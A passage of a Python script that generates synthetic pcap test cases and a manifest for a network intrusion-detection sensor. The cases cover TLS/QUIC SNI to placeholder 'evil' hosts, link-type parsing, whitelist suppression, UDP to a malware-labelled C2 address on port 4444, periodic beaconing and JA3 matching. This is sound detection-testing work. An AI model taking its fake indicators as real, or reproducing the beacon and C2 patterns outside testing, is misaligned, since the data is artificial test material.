                                     tcp(50430, 443, 0x18, tls_client_hello("tls6-evil.example"))), ethertype=0x86dd))]
    cases.append(("tls_sni_ipv6", DLT_EN10MB, packets, ["tls6-evil.example"], "TLS ClientHello SNI over IPv6"))

    # 28c. A QUIC ClientHello spread over two Initials, CRYPTO frames out of order the way Chrome
    # sends them; the SNI is in the second.
    hs = tls_client_hello("quic-split-evil.example", with_record=False, pad=1500)
    cut = [0, 500, 1000, 1200, len(hs)]
    part = [crypto_frame(cut[i], hs[cut[i]:cut[i + 1]]) for i in range(4)]
    dcid = b"\x21\x22\x23\x24\x25\x26\x27\x28"
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "203.0.113.37", 17, udp(50440, 443, quic_initial_frames(part[2] + part[0], dcid, 0))))),
        (BASE_SEC, frame(ipv4(ATTACKER, "203.0.113.37", 17, udp(50440, 443, quic_initial_frames(part[3] + part[1], dcid, 1))))),
    ]
    cases.append(("quic_sni_split", DLT_EN10MB, packets, ["quic-split-evil.example"],
                  "QUIC ClientHello over two Initials, frames out of order, SNI in the second"))

    # 29. raw-IP and LINUX_SLL link types
    packets = [(BASE_SEC, ipv4(ATTACKER, "66.66.66.66", 6, tcp(50500, 443, 0x02)))]
    cases.append(("dlt_raw", DLT_RAW, packets, ["66.66.66.66"], "DLT_RAW (no link header)"))
    packets = [(BASE_SEC, sll(ipv4(ATTACKER, "66.66.66.66", 6, tcp(50501, 443, 0x02))))]
    cases.append(("dlt_sll", DLT_LINUX_SLL, packets, ["66.66.66.66"], "DLT_LINUX_SLL ('any' interface)"))

    # 29a. the link types whose header is not a fixed offset, or was never parsed right: BSD,
    # macOS and Windows loopback (IPv6 family 24/28/30), OpenBSD loopback, IPsec enc, pflog,
    # NFLOG, Linux "any" in its v2 form, raw IPv6, and 802.11 behind radiotap headers of two
    # different lengths (an offset learned from the first would misread the second)
    v4_hit = lambda port: ipv4(ATTACKER, "66.66.66.66", 6, tcp(port, 443, 0x02))
    v6_hit = lambda port: ipv6("dead::1", "dead::beef", 6, tcp(port, 443, 0x02))
    packets = [(BASE_SEC + i, struct.pack("<I", family) + v6_hit(50510 + i)) for i, family in enumerate((24, 28, 30))]
    packets.append((BASE_SEC + 3, struct.pack("<I", 2) + v4_hit(50513)))
    cases.append(("dlt_null", LINKTYPE_NULL, packets, ["dead::beef", "66.66.66.66"],
                  "DLT_NULL loopback, every IPv6 address family"))
    packets = [(BASE_SEC, struct.pack(">I", 24) + v6_hit(50520)), (BASE_SEC + 1, struct.pack(">I", 2) + v4_hit(50521))]
    cases.append(("dlt_loop", LINKTYPE_LOOP, packets, ["dead::beef", "66.66.66.66"], "OpenBSD DLT_LOOP"))
    packets = [(BASE_SEC, struct.pack(">III", 2, 0xdeadbeef, 1) + v4_hit(50530))]
    cases.append(("dlt_enc", LINKTYPE_ENC, packets, ["66.66.66.66"], "OpenBSD enc0 (IPsec)"))
    packets = [(BASE_SEC, pflog(v4_hit(50540), 61)), (BASE_SEC + 1, pflog(v6_hit(50541), 69))]
    cases.append(("dlt_pflog", LINKTYPE_PFLOG, packets, ["66.66.66.66", "dead::beef"],
                  "pflog, two header lengths"))
    packets = [(BASE_SEC, nflog(v4_hit(50550)))]
    cases.append(("dlt_nflog", LINKTYPE_NFLOG, packets, ["66.66.66.66"], "Linux NFLOG"))
    packets = [(BASE_SEC, sll2(v4_hit(50560)))]
    cases.append(("dlt_sll2", LINKTYPE_LINUX_SLL2, packets, ["66.66.66.66"], "DLT_LINUX_SLL2"))
    packets = [(BASE_SEC, v6_hit(50570))]
    cases.append(("dlt_ipv6", LINKTYPE_IPV6, packets, ["dead::beef"], "raw IPv6 link type"))
    packets = [
        (BASE_SEC, radiotap_80211(ipv4(ATTACKER, "203.0.113.200", 6, tcp(50580, 443, 0x02)), 8)),
        (BASE_SEC + 1, radiotap_80211(ipv4(ATTACKER, "203.0.113.201", 6, tcp(50581, 443, 0x02)), 8)),
        (BASE_SEC + 2, radiotap_80211(v4_hit(50582), 18, qos=True)),
    ]
    cases.append(("dlt_radiotap", LINKTYPE_IEEE802_11_RADIOTAP, packets, ["66.66.66.66"],
                  "802.11 behind radiotap; the trail hit is in the third frame, with a longer radiotap header"))

    # 29b. PPPoE-encapsulated IP, plain and behind a VLAN tag
    packets = [
        (BASE_SEC, pppoe(ipv4(ATTACKER, "66.66.66.66", 6, tcp(50502, 443, 0x02)))),
        (BASE_SEC + 1, pppoe(ipv4(ATTACKER, "66.66.66.66", 6, tcp(50503, 443, 0x02)), vlan=100)),
        # PPP control traffic carries no IP and must stay silent rather than being misparsed.
        (BASE_SEC + 2, pppoe(ipv4(ATTACKER, "6.6.6.6", 6, tcp(50504, 443, 0x02)), ppp_proto=0xc021)),
    ]
    cases.append(("pppoe", DLT_EN10MB, packets, ["66.66.66.66"],
                  "PPPoE session encapsulation (a mirrored DSL/fibre uplink)"))

    # 30. IPv4 options (IHL > 5)
    packets = [(BASE_SEC, frame(ipv4(ATTACKER, "66.66.66.66", 6, tcp(50600, 443, 0x02), ihl=6)))]
    cases.append(("ipv4_options", DLT_EN10MB, packets, ["66.66.66.66"], "IHL=6 must shift the transport offset"))

    # 31. whitelisted destinations stay silent
    packets = [
        (BASE_SEC, frame(ipv4("127.0.0.1", "127.0.0.1", 6, tcp(50700, 443, 0x02)))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50701, 53, dns_query("localhost.localdomain"))))),
    ]
    cases.append(("whitelisted", DLT_EN10MB, packets, [], "whitelist and ignore-suffix handling"))

    # 32. ignored DNS suffixes (".example", ".local", ".arpa", ...) must stay silent even
    #     though the name matches a trail-like pattern
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50800, 53, dns_query("dga1234.example"))))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50801, 53, dns_query("host.local"))))),
        (BASE_SEC + 2, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50802, 53, dns_query("1.0.0.127.in-addr.arpa"))))),
        (BASE_SEC + 3, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50803, 53, dns_query("x.intranet.corp"))))),
    ]
    cases.append(("dns_ignored_suffixes", DLT_EN10MB, packets, [],
                  "IGNORE_DNS_QUERY_SUFFIXES / '.intranet.' guards"))

    # 33. UDP to a malware-labelled DESTINATION. Non-DNS UDP follows the TCP rule: "attacker" is
    #     suppressed on the destination side and "malware" only on the source side, so a datagram
    #     to a known C2 address is reported. Applying the source-side "malware" suppression to
    #     either match would silence exactly this traffic.
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "66.66.66.66", 17, udp(50900, 4444, b"\x00" * 16)))),
    ]
    cases.append(("udp_malware_dst", DLT_EN10MB, packets, ["66.66.66.66"],
                  "non-DNS UDP to a malware-labelled destination is reported"))

    # 34. Two DIFFERENT DNS queries back-to-back on one socket in one second - a stub resolver
    #     walking its `search` list does exactly this. The burst filter runs BEFORE the DNS parser,
    #     so a filter keyed on (second, 5-tuple) alone would never examine the second datagram; a
    #     payload hash in the key skips the repeat and still parses a different query.
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50901, 53, dns_query("clean-first.com"))))),
        (BASE_SEC, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50901, 53, dns_query("evil-test-domain.com"))))),
    ]
    cases.append(("dns_same_socket_burst", DLT_EN10MB, packets, ["evil-test-domain.com"],
                  "distinct DNS queries sharing a socket in one second are all examined"))

    # 34b. A specific static trail under a whitelisted PARENT domain. Suppressing a name whenever
    #     any ancestor is whitelisted would make an IOC under a shared platform
    #     (`googleusercontent.com`, in data/whitelist.txt) unable to fire - 3,082 real static
    #     trails are exactly this shape. Longest-match precedence: the exact trail beats the
    #     broader whitelist entry, while a sibling without its own trail stays suppressed.
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "8.8.8.8", 17,
                              udp(50902, 53, dns_query("evil-test.googleusercontent.com"))))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "8.8.8.8", 17,
                                  udp(50903, 53, dns_query("benign.googleusercontent.com"))))),
    ]
    cases.append(("trail_under_whitelist_parent", DLT_EN10MB, packets,
                  ["evil-test.googleusercontent.com"],
                  "exact trail beats whitelisted ancestor; whitelisted sibling stays silent"))

    # 35. mixed traffic soup (everything at once, interleaved)
    soup = []
    for i, (_name, _lt, pkts, _exp, _notes) in enumerate(cases[:12]):
        for ts, raw in pkts[:4]:
            soup.append((ts + i, raw))
    soup.sort(key=lambda item: item[0])
    cases.append(("mixed_soup", DLT_EN10MB, soup, [], "interleaved traffic from many cases"))

    # 36. periodic beaconing. Nine SYNs to one destination exactly 30 s apart cross the
    #     coefficient-of-variation bound at the eighth gap and produce one
    #     `potential periodic beaconing (suspicious)` event; a same-sized control flow with human
    #     jitter must stay silent. The verdict needs real gaps, so this case is in
    #     TIMING_WINDOW_CASES: on wall-clock time every packet lands on the same second.
    #     https://tools.ietf.org/html/rfc6761-style documentation lives in heuristics/beacon.rs.
    beacon_pkts = [(BASE_SEC + 30 * i, frame(ipv4(ATTACKER, "203.0.113.77", 6,
                                              tcp(51000, 443, 0x02, b"")))) for i in range(12)]
    ctrl_gaps = [52, 71, 44, 83, 39, 66, 91, 48, 77, 55]
    ctrl_sec = BASE_SEC + 100000
    ctrl_pkts = []
    for i, g in enumerate(ctrl_gaps):
        ctrl_sec += g
        ctrl_pkts.append((ctrl_sec + i * 0, frame(ipv4(ATTACKER, "203.0.113.78", 6,
                                                        tcp(51001, 443, 0x02, b"")))))
    cases.append(("tcp_periodic_beacon", DLT_EN10MB, sorted(beacon_pkts + ctrl_pkts), [],
                  "timer-regular reconnects fire once; jittered control stays silent "
                  "(pcap-timestamp gated)"))

    # 37. TLS client fingerprints. The ClientHello's
    # JA3 is a listed trail; the same hello also carries an SNI, which is how the pre-existing
    # tls_sni case keeps working alongside it. A bare SYN control stays silent.
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "203.0.113.35", 6, tcp(50600, 443, 0x18, tls_client_hello("ja3-evil.example"))))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "203.0.113.36", 6, tcp(50601, 443, 0x02)))),
    ]
    cases.append(("tcp_malware_ja3", DLT_EN10MB, packets, ["1e7c622032b0cb79401b0f7be3793a1a"],
                  "ClientHello JA3 matched against the trail set ("
                  "CHECK_TLS_FINGERPRINTS)"))

    return cases


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--out", default=os.path.join(ROOT, "sensor", "tests", "corpus"))
    options = parser.parse_args()

    out = os.path.abspath(options.out)
    if not os.path.isdir(out):
        os.makedirs(out)

    with open(os.path.join(out, "trails.csv"), "w") as f:
        for trail, info, reference in TRAILS:
            f.write("%s,%s,%s\n" % (trail, info, reference))

    manifest = []
    for name, linktype, packets, expected, notes in build_cases():
        filename = "%s.pcap" % name
        write_pcap(os.path.join(out, filename), packets, linktype)
        manifest.append({
            "name": name,
            "pcap": filename,
            "linktype": linktype,
            "packets": len(packets),
            # Pinned detections are merged into `expect` rather than kept in a separate key: a
            # separate key is one nothing has to read, and then nothing checks it.
            "expect": expected + [_ for _ in PINNED_CASES.get(name, []) if _ not in expected],
            "needs_pcap_timestamps": name in TIMING_WINDOW_CASES,
            "timestamp_sensitive": name in TIMESTAMP_SENSITIVE_CASES,
            "notes": notes,
        })

    with open(os.path.join(out, "manifest.json"), "w") as f:
        json.dump(manifest, f, indent=2, sort_keys=True)
        f.write("\n")

    print("[i] wrote %d pcap(s) + trails.csv + manifest.json to %s" % (len(manifest), out))
    print("[i] total packets: %d" % sum(_["packets"] for _ in manifest))


if __name__ == "__main__":
    main()
